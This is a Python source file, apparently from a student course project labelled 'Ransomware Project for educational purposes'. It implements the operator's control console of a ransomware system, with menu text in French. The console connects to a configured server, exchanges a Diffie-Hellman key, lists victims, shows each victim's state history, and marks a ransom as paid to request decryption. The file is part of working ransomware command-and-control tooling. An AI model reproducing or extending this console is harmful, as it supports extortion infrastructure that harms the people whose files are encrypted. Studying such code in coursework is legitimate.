# --------------------------------------------
# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : main
# --------------------------------------------
import socket
from utile import security
import utile.configgetter as config
from utile import message
from utile import input as custom_input
from utile.network import send_msg, recv_msg


key = b''

def print_menu():
    print('CONSOLE DE CONTRÔLE'
              '\n==================='
              '\n1) Liste des victimes du ransomware'
              '\n2) Historique des états d''une victime'
              '\n3) Renseigner le paiement de rançon d' 'une victime'
              '\n4) Quitter')

def main():
    """ Console de contrôle """
    global key
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((config.get_ip("config.json"), config.get_port("config.json")))
    choix = None
    hasAsked = False
    key_f = security.diffie_hellman_recv_key(s)
    key = key_f
    l_id = []
    while choix != '4':
        print_menu()
        choix = input('Votre choix : ')
        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        if choix == '1':
            hasAsked = True
            d = message.list_victim_req()
            send_msg(s, d, key_f)
            data = recv_msg(s, key_f)
            print('LISTING DES VICTIMES DU RANSOMWARE\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            print(data)
            print('\n')
            l_id = data
        elif choix == '2':
            if hasAsked:
                id = input('Merci de préciser un ID pour consulter l''historique : ')
                d = message.history_req(id)
                send_msg(s, d, key_f)
                data_h = recv_msg(s, key_f)
                print(str(data_h) +"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            else:
                print("ERREUR : Veuillez d'abord lister les victimes!")
        elif choix == '3':
            change_state(s, l_id)
            data = recv_msg(s, key_f)
            print(data)
            print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        elif choix == '4':
            r = message.close_connexion()
            send_msg(s, r, key_f)
            data = recv_msg(s, key_f)
            print(str(data)+"\n")
            break
    s.close()


def change_state(s_client, liste_id):
    global key
    if not liste_id:
        print("ERREUR: Veuillez d'abord lister les victimes!")
        return

    print("DEMANDE DE DECHIFFREMENT")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    id_victim = custom_input.get_int_between("ID de victime ", 1, len(liste_id))
    msg = message.get_message("change_state", [id_victim])
    send_msg(s_client, msg, key)


if __name__ == '__main__':
    main()

